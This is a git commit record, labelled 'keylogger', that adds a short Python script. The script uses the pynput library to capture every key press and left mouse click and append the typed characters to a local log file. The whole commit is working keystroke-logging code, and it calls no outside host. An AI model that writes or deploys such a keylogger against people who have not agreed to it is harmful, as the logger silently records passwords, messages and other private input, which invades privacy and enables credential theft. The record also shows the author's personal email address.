5f0b1be51daadbd7710f06b6605327776998f1eb
Cyrilnkl <cyrilnkl5@gmail.com>
2024-03-27 10:56:25 +0100

    keylogger

---
+++ main.py
@@ -0,0 +1,34 @@
+from pynput import keyboard, mouse
+
+def writeFile(key):
+    f = open("logz.txt", "a")
+    f.write(key)
+    f.close()
+
+
+def keyPressed(key):
+    try:
+        print(key)
+        char = key.char
+        writeFile(char)
+    except:
+        # FOR SPACES AND KEY THAT ARE NOT CHAR
+        if (key == key.space):
+            writeFile("\n")
+        elif (key == key.backspace):
+            writeFile('[del]')
+
+def mouseClicked(x, y, button, pressed):
+    f = open("log.txt", "a")
+    print(button, "button")
+    if (button == button.left):
+        print("on envoie")
+        writeFile("\n")
+
+
+if __name__ == '__main__':
+    key_listener = keyboard.Listener(on_press=keyPressed)
+    mouse_listener = mouse.Listener(on_click=mouseClicked)
+    key_listener.start()
+    mouse_listener.start()
+    input()
